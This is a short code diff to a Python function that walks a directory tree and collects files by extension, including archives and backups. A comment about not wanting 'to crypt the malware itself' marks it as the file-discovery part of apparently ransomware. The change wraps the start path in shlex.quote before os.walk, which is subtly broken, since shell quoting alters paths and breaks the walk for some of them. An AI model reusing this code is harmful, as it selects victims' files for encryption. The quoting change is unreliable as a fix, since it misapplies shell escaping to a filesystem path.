@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 import os
+import shlex
+
 
 def discoverFiles(startpath):
     '''
@@ -45,7 +47,7 @@ def discoverFiles(startpath):
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
     ]
 
-    for dirpath, dirs, files in os.walk(startpath):
+    for dirpath, dirs, files in os.walk(shlex.quote(startpath)):
         for i in files:
             absolute_path = os.path.abspath(os.path.join(dirpath, i))
             # don't want to crypt the malware itself
